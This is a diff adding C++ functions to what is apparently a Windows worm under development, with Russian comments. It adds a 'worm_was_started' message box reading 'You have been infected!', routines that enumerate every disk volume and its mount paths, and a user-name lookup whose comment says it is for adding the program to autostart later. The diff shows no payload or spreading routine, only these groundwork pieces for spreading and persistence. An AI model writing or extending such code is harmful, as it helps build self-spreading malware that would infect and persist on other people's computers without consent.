@@ -61,3 +61,59 @@ std::wstring get_filename_stem(const fs::path& filepath) {
 }
 
 
+void worm_was_started() {
+    MessageBoxW(
+        NULL,                            // Владелец окна (NULL — нет владельца)
+        L"Ты был заражён!",              // Текст сообщения
+        L"Предупреждение",               // Заголовок окна
+        MB_OK | MB_ICONWARNING           // Кнопка OK и значок предупреждения
+    );
+}
+
+
+vector<wstring> get_all_volumes() { // находим все корневые директории
+    vector<wstring> volumes;
+
+    wchar_t volumeName[MAX_PATH] = { 0 };
+    HANDLE hFind = FindFirstVolumeW(volumeName, ARRAYSIZE(volumeName));
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        wcerr << L"Ошибка при вызове FindFirstVolumeW\n";
+        return volumes;
+    }
+
+    do {
+        volumes.push_back(volumeName);
+    } while (FindNextVolumeW(hFind, volumeName, ARRAYSIZE(volumeName)));
+
+    FindVolumeClose(hFind);
+    return volumes;
+}
+
+
+vector<wstring> get_paths_for_volume(const wstring& volumeName) { // преобразуем в wstring найденные дирректории
+    vector<wstring> paths;
+
+    DWORD returnLength = 0;
+    wchar_t buffer[MAX_PATH * 10] = { 0 };
+
+    if (GetVolumePathNamesForVolumeNameW(volumeName.c_str(), buffer, ARRAYSIZE(buffer), &returnLength)) {
+        wchar_t* current = buffer;
+        while (*current) {
+            paths.push_back(current);
+            current += wcslen(current) + 1;
+        }
+    }
+    else {
+        wcerr << L"Невозможно получить путь для тома: " << volumeName << L"\n";
+    }
+
+    return paths;
+}
+
+wstring get_username() { // получаем юсер нейм пользователя для добавления в автозагрузку в дальнейшем
+    wchar_t username[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    GetUserNameW(username, &size);
+    return std::wstring(username);
+}
